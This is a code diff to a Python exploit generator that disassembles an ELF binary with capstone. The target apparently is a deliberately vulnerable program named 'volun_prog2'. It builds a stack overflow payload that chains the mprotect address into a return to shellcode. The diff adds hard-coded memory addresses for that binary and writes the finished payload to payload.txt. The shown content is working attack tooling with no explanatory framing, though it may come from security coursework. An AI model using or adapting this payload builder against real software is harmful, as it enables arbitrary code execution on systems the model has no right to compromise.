@@ -4,7 +4,14 @@ import sys
 from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
-filename= '/usr/bin/make'
+filename= 'a.out'
+#for modified volun_prog2:
+'''
+base of binary: 0x555555554000
+address of mprotect: 0x7ffff7affc00
+start of payload: 0x7fffffffdf90
+base of stack: 0x7fffffffe0b0
+'''
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
 
 def zerochecker(bytes, expectedLength):
@@ -174,5 +181,6 @@ if heapOrStack == "S":
         payload += mprotect_addr
         shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
         payload += shellcode_addr + b"\x00\x00" + shellcode
-        print(payload)
-
+        f = open('payload.txt', 'wb')
+        f.write(payload)
+        f.close()
